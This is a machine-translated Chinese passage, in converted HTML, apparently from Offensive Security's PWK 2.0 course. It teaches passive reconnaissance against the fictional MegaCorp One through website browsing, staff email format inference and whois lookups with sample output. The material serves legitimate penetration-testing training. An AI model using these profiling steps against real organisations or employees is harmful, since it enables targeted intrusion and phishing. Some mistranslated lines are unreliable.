<div style="position:absolute;top:160100;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以单个员工为目标。</font><font style="vertical-align: inherit;">简单地删除“大卫”并不能解决问题</font></font></i></nobr></div>
<div style="position:absolute;top:160120;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">问题。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来看看一些最流行的工具和技术，它们可以帮助我们进行</font></font></nobr></div>
<div style="position:absolute;top:160201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功的信息收集活动。</font><font style="vertical-align: inherit;">我们将使用 MegaCorp One，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">138</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一家虚构的公司</font></font></nobr></div>
<div style="position:absolute;top:160220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 Offensive Security 创建，作为我们活动的主题。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:160258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.1 做笔记</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集活动可以产生大量数据，我们必须管理</font></font></nobr></div>
<div style="position:absolute;top:160319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该数据很好，以便我们可以在进一步搜索中利用它或在以后的阶段使用它。</font><font style="vertical-align: inherit;">没有</font></font></nobr></div>
<div style="position:absolute;top:160338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确或错误的记笔记方式。</font><font style="vertical-align: inherit;">但是，我们可能会发现以后更容易检索信息，如果</font></font></nobr></div>
<div style="position:absolute;top:160357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们保留详细且格式良好的笔记。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:160427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">138 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.megacorpone.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:160555;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="136"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 136 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:160588;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:161665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:161665;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:161665;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">136</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:160684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.2 网站侦察</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果客户有网站，我们可以通过简单地浏览网站来收集基本信息。</font><font style="vertical-align: inherit;">小的</font></font></nobr></div>
<div style="position:absolute;top:160745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织可能只有一个网站，而大型组织可能有很多，包括</font></font></nobr></div>
<div style="position:absolute;top:160764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些没有得到维护。</font><font style="vertical-align: inherit;">让我们看看 MegaCorp One 的网站</font></font></nobr></div>
<div style="position:absolute;top:160784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.megacorpone.com/</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 以了解有关我们目标的更多信息。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:161308;left:386"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 19：MegaCorp One</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速浏览一下他们的网站，就会发现他们是一家纳米技术公司。</font></font></nobr></div>
<div style="position:absolute;top:161372;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.megacorpone.com/about.html 上</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的关于页面</font><font style="vertical-align: inherit;">显示电子邮件地址和 Twitter</font></font></nobr></div>
<div style="position:absolute;top:161391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分员工的账目： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:161743;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="137"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 137 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:161776;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:162853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:162853;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:162853;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">137</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:162354;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 20：关于我们 - MegaCorp One</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:162385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在社交媒体信息收集活动中使用这些地址。</font><font style="vertical-align: inherit;">我们会讨论</font></font></nobr></div>
<div style="position:absolute;top:162405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这在后面的部分中更详细。</font></font></nobr></div>
<div style="position:absolute;top:162437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还值得一提的是，该公司的电子邮件地址格式遵循“首字母</font></font></nobr></div>
<div style="position:absolute;top:162456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 姓氏”。</font><font style="vertical-align: inherit;">但是，他们 CEO 的电子邮件地址仅使用他的名字。</font><font style="vertical-align: inherit;">这表明</font></font></nobr></div>
<div style="position:absolute;top:162476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创始人或长期员工的电子邮件格式与新员工不同。</font><font style="vertical-align: inherit;">此信息</font></font></nobr></div>
<div style="position:absolute;top:162495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估的后期阶段可能有用。</font></font></nobr></div>
<div style="position:absolute;top:162528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在同一页面上找到的企业社交媒体帐户也值得进一步记录</font></font></nobr></div>
<div style="position:absolute;top:162548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">研究： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:162931;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="138"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 138 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:162964;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:164041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:164041;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:164041;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">138</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163550;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 21：社交媒体 - MegaCorp One</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们更新我们的笔记以跟踪这些信息中的每一个，包括电子邮件地址</font></font></nobr></div>
<div style="position:absolute;top:163601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式和社交媒体网站参考。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:163638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.3 Whois 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163679;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Whois </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种 TCP 服务、工具和一种数据库，可以提供有关域的信息</font></font></nobr></div>
<div style="position:absolute;top:163699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称服务器</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">140</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">registrar</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">141</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自注册服务商以来，这些信息通常是公开的。</font></font></nobr></div>
<div style="position:absolute;top:163718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收取私人注册费用。</font></font></nobr></div>
<div style="position:absolute;top:163751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过执行标准的前向搜索来收集有关域名的基本信息</font></font></nobr></div>
<div style="position:absolute;top:163770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将域名 megacorpone.com 传递给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whois</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:163805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whois megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:163822;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：MEGACORPONE.COM</font></font></nobr></div>
<div style="position:absolute;top:163839;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册域 ID：1775445745_DOMAIN_COM-VRSN</font></font></nobr></div>
<div style="position:absolute;top:163856;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册机构 WHOIS 服务器：whois.gandi.net</font></font></nobr></div>
<div style="position:absolute;top:163873;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册商网址：http://www.gandi.net</font></font></nobr></div>
<div style="position:absolute;top:163890;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新日期：2019-01-01T09:45:03Z</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:163951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/WHOIS</font></font></font></nobr></div>
<div style="position:absolute;top:163971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">140 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Name_server</font></font></font></nobr></div>
<div style="position:absolute;top:163991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">141 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Domain_name_registrar</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:164119;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="139"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 139 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:164152;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:165229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:165229;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:165229;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164248;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建日期：2013-01-22T23:01:00Z</font></font></nobr></div>
<div style="position:absolute;top:164264;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表到期日期：2023-01-22T23:01:00Z</font></font></nobr></div>
<div style="position:absolute;top:164281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:164298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登记处注册人 ID： </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:164316;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册人姓名：艾伦·格罗菲尔德</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册机构：MegaCorpOne</font></font></nobr></div>
<div style="position:absolute;top:164349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Registrant Street: 2 Old Mill St</font></font></nobr></div>
<div style="position:absolute;top:164366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册城市：Rachel</font></font></nobr></div>
<div style="position:absolute;top:164383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册州/省：内华达州</font></font></nobr></div>
<div style="position:absolute;top:164400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册人邮政编码：89001</font></font></nobr></div>
<div style="position:absolute;top:164417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册国：美国</font></font></nobr></div>
<div style="position:absolute;top:164434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册人电话：+1.9038836342</font></font></nobr></div>
<div style="position:absolute;top:164451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:164468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表管理员 ID： </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:164485;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员姓名：Alan Grofield</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理机构：MegaCorpOne</font></font></nobr></div>
<div style="position:absolute;top:164519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政街：2 Old Mill St</font></font></nobr></div>
<div style="position:absolute;top:164536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政城市：雷切尔</font></font></nobr></div>
<div style="position:absolute;top:164553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政州/省：内华达州</font></font></nobr></div>
<div style="position:absolute;top:164570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理邮政编码：89001</font></font></nobr></div>
<div style="position:absolute;top:164587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理国家：美国</font></font></nobr></div>
<div style="position:absolute;top:164604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员电话：+1.9038836342</font></font></nobr></div>
<div style="position:absolute;top:164621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:164638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册技术 ID： </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:164655;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术名称：Alan Grofield</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术组织：MegaCorpOne</font></font></nobr></div>
<div style="position:absolute;top:164689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">科技街：2 Old Mill St</font></font></nobr></div>
<div style="position:absolute;top:164706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">科技城：瑞秋</font></font></nobr></div>
<div style="position:absolute;top:164723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">科技州/省：内华达州</font></font></nobr></div>
<div style="position:absolute;top:164740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">科技邮编：89001</font></font></nobr></div>
<div style="position:absolute;top:164757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术国家：美国</font></font></nobr></div>
<div style="position:absolute;top:164773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术电话：+1.9038836342</font></font></nobr></div>
<div style="position:absolute;top:164790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:164808;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称服务器：NS1.MEGACORPONE.COM</font></font></b></nobr></div>
<div style="position:absolute;top:164825;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称服务器：NS2.MEGACORPONE.COM</font></font></b></nobr></div>
<div style="position:absolute;top:164842;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称服务器：NS3.MEGACORPONE.COM</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:164878;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 194 - 在 megacorpone.com 上使用 whois</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:164907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并非所有这些数据都有用，但我们确实发现了一些有价值的信息。</font><font style="vertical-align: inherit;">首先，输出显示</font></font></nobr></div>
<div style="position:absolute;top:164926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Alan Grofield 注册了域名。</font><font style="vertical-align: inherit;">根据 Megacorp One Contact 页面，艾伦</font></font></nobr></div>
<div style="position:absolute;top:164946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是“IT 和安全总监”。</font></font></nobr></div>
<div style="position:absolute;top:164979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还找到了 MegaCorp One 的名称服务器。</font><font style="vertical-align: inherit;">名称服务器是 DNS 的一个组成部分，它</font></font></nobr></div>
<div style="position:absolute;top:164998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不会在这里检查，但我们应该将这些服务器添加到我们的笔记中。</font></font></nobr></div>
<div style="position:absolute;top:165031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了这个标准的前向查找，它收集有关 DNS 名称的信息，</font></font></nobr></div>
<div style="position:absolute;top:165050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whois 客户端也可以执行反向查找。</font><font style="vertical-align: inherit;">假设我们有一个IP地址，我们可以执行</font></font></nobr></div>
<div style="position:absolute;top:165070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向查找以收集有关它的更多信息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:165104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whois 38.100.193.70</font></font></font></b></nobr></div>
<div style="position:absolute;top:165121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:165139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络范围：38.0.0.0 - 38.255.255.255</font></font></nobr></div>
<div style="position:absolute;top:165155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIDR：    </font></font></nobr></div>
<div style="position:absolute;top:165155;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.0.0.0/8</font></font></nobr></div>
<div style="position:absolute;top:165172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网名：    </font></font></nobr></div>
<div style="position:absolute;top:165172;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">COGENT-A </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:165307;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="140"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 140 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:165340;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:166417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:166417;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:166417;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">140</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:165436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:165452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织名称：    </font></font></nobr></div>
<div style="position:absolute;top:165452;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSINet, Inc.</font></font></nobr></div>
<div style="position:absolute;top:165469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织 ID：    </font></font></nobr></div>
<div style="position:absolute;top:165469;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSI</font></font></nobr></div>
<div style="position:absolute;top:165486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：    </font></font></nobr></div>
<div style="position:absolute;top:165486;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2450 N街西北</font></font></nobr></div>
<div style="position:absolute;top:165504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">城市：    </font></font></nobr></div>
<div style="position:absolute;top:165504;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">华盛顿</font></font></nobr></div>
<div style="position:absolute;top:165520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StateProv: DC</font></font></nobr></div>
<div style="position:absolute;top:165537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮政编码：20037</font></font></nobr></div>
<div style="position:absolute;top:165554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家：    </font></font></nobr></div>
<div style="position:absolute;top:165554;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:165571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册日期：    </font></font></nobr></div>
<div style="position:absolute;top:165588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新：    </font></font></nobr></div>
<div style="position:absolute;top:165588;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2015-06-04</font></font></nobr></div>
<div style="position:absolute;top:165605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:165625;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 195 - Whois 反向查找</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向查找的结果为我们提供了有关谁托管 IP 地址的信息。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:165673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息稍后可能会有用，并且与我们收集的所有信息一样，我们会将其添加到我们的</font></font></nobr></div>
<div style="position:absolute;top:165693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">笔记。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:165727;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Kali 中的 whois 工具识别 MegaCorp One 的名称服务器。</font></font></nobr></div>
</span></font>
